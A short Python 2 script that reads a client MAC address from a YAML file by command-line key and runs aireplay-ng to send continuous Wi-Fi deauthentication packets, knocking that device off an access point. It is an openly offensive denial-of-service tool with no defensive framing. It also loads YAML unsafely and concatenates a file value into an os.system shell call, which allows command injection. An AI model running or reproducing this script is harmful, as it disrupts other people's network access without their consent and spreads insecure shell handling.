import os;
import sys;
import yaml;

print 'Number of arguments:', len(sys.argv), 'arguments.';
for arg in sys.argv:
    item = arg;

macs = yaml.load(open("Mac.yaml"));
if(macs.has_key(item)):
    os.system("iwconfig mon0 channel 1");
    os.system("aireplay-ng -0 0 -a APMAC -c "+macs.get(item)+" -e endow mon0");

